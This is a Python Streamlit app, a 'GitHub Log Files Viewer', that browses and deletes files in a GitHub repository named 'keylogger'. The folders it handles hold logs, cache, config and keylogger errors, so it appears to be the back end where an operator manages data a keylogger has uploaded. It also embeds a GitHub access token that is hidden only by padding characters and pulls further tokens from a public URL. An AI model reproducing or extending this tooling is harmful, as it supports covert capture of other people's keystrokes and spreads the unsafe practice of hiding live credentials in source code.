import streamlit as st
import requests
from datetime import datetime
from functools import lru_cache

# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "delete" key exists
            if "delete" in token_data:
                token = token_data["delete"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'delete' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")
access_token = GITHUB_TOKEN

# GitHub API configuration
GITHUB_REPO_OWNER = "bebedudu"
GITHUB_REPO_NAME = "keylogger"

# Add folder selection at the top
FOLDERS = {
    "Logs": "uploads/logs",
    "Cache": "uploads/cache",
    "Config": "uploads/config",
    "Keylog Errors": "uploads/keylogerror"
}

# Add cache decorators to API functions
@lru_cache(maxsize=32)
def get_files_from_github(access_token, folder_path):
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/vnd.github+json"
    }
    api_url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{folder_path}"
    response = requests.get(api_url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        st.error(f"Error fetching files: {response.status_code} - {response.text}")
        return None

@lru_cache(maxsize=128)
def get_last_updated(access_token, file_path):
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/vnd.github+json"
    }
    commits_url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/commits?path={file_path}"
    response = requests.get(commits_url, headers=headers)
    
    if response.status_code == 200 and response.json():
        last_commit_date = response.json()[0]['commit']['author']['date']
        commit_dt = datetime.strptime(last_commit_date, "%Y-%m-%dT%H:%M:%SZ")
        absolute_time = commit_dt.strftime("%Y-%m-%d %H:%M:%S")
        relative_time = humanize_time(commit_dt)
        return f"{absolute_time} - ({relative_time})"
    return "Unknown"

def humanize_time(dt):
    """Convert datetime to relative time string"""
    now = datetime.utcnow()
    diff = now - dt
    seconds = diff.total_seconds()
    
    if seconds < 60:
        return "just now"
    minutes = int(seconds // 60)
    if minutes < 60:
        return f"{minutes} minute{'s' if minutes != 1 else ''} ago"
    hours = int(minutes // 60)
    if hours < 24:
        return f"{hours} hour{'s' if hours != 1 else ''} ago"
    days = int(hours // 24)
    if days < 30:
        return f"{days} day{'s' if days != 1 else ''} ago"
    months = int(days // 30)
    if months < 12:
        return f"{months} month{'s' if months != 1 else ''} ago"
    years = int(months // 12)
    return f"{years} year{'s' if years != 1 else ''} ago"

def delete_file(access_token, file_path, sha):
    """Delete a file from GitHub repository"""
    url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{file_path}"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/vnd.github+json"
    }
    data = {
        "message": "Deleted via Streamlit app",
        "sha": sha
    }
    response = requests.delete(url, headers=headers, json=data)
    return response

# Add cache decorator to API calls
@lru_cache(maxsize=32)
def get_files_from_github_cached(access_token, folder_path):
    return get_files_from_github(access_token, folder_path)

@lru_cache(maxsize=128)
def get_last_updated_cached(access_token, file_path):
    return get_last_updated(access_token, file_path)

def main():
    # Initialize session state for selected files
    if 'selected_files' not in st.session_state:
        st.session_state.selected_files = []

    st.title("GitHub Log Files Viewer")
    
    # Add refresh button at the top
    col1, col2 = st.columns([4, 1])
    with col2:
        if st.button("🔄 Refresh Data", help="Clear cache and reload latest data"):
            get_files_from_github.cache_clear()
            get_last_updated.cache_clear()
            st.rerun()
    
    # Multi-folder selection
    st.sidebar.subheader("Select Folders")
    selected_folders = []
    cols = st.columns(4)
    for i, folder in enumerate(FOLDERS.keys()):
        with cols[i % 4]:
            if st.sidebar.checkbox(folder, key=f"folder_{folder}"):
                selected_folders.append(FOLDERS[folder])
    
    if not selected_folders:
        st.info("Please select at least one folder")
        return
    
    # Get files from all selected folders
    all_files = []
    for folder_path in selected_folders:
        files = get_files_from_github_cached(access_token, folder_path)
        if files:
            all_files.extend(files)
    
    if all_files:
        # Create file options with timestamps
        file_options = []
        file_details = {}
        for file in all_files:
            if file['type'] == 'file':
                # last updated with timestamp in multiselect
                # last_updated = get_last_updated_cached(access_token, file['path'])
                # display_name = f"{file['name']} ({last_updated.split('(')[-1].replace(')', '').strip()})"
                # # Extract relative time from the timestamp string
                # relative_time = last_updated.split("(")[-1].replace(")", "").strip()
                # display_name = f"{file['name']} ({relative_time})"
                # -----------------------------------------------------
                display_name = file['name']  # Use just the filename
                file_options.append(display_name)
                file_details[display_name] = file
        
        # File selection dropdown with session state
        selected_files = st.sidebar.multiselect(
            "Select files to delete",
            file_options,
            default=st.session_state.selected_files,
            key="file_selector"
        )

        # Update session state with current selection
        st.session_state.selected_files = selected_files

        # Delete button with confirmation
        if selected_files:
            if st.sidebar.button("🗑️ Delete Selected Files", type="primary"):
                for display_name in selected_files:
                    file = file_details[display_name]
                    response = delete_file(access_token, file['path'], file['sha'])
                    if response.status_code == 200:
                        st.success(f"Successfully deleted {file['name']}")
                    else:
                        st.error(f"Failed to delete {file['name']}: {response.text}")
                # Clear selection after successful deletion
                st.session_state.selected_files = []
                st.rerun()
        
        # Display files from all selected folders
        for folder_path in selected_folders:
            folder_name = [k for k, v in FOLDERS.items() if v == folder_path][0]
            st.subheader(f"Files in {folder_name}")
            files = get_files_from_github_cached(access_token, folder_path)
            if files:
                for file in files:
                    if file['type'] == 'file':
                        col1, col2, col3 = st.columns([1, 4, 1])
                        with col2:
                            last_updated = get_last_updated_cached(access_token, file['path'])
                            st.write(f"📄 **{file['name']}**")
                            st.caption(f"Last updated: {last_updated}")
                        with col3:
                            if st.button("🗑️ Delete", 
                                       key=f"del_{file['path']}", 
                                       help=f"Delete {file['name']}"):
                                response = delete_file(access_token, file['path'], file['sha'])
                                if response.status_code == 200:
                                    st.success(f"Deleted {file['name']}")
                                    st.rerun()
                                else:
                                    st.error(f"Delete failed: {response.text}")
                        with col1:
                            st.write("")  # Spacer
                st.write("---")

# Streamlit app
st.set_page_config(page_title="Delete Files", layout="wide", page_icon=":🗑️:")

# app logic to authenticate user
if st.session_state["authenticated"]:
    main()
else:
    st.error("Please login (Homepage) to access this page.")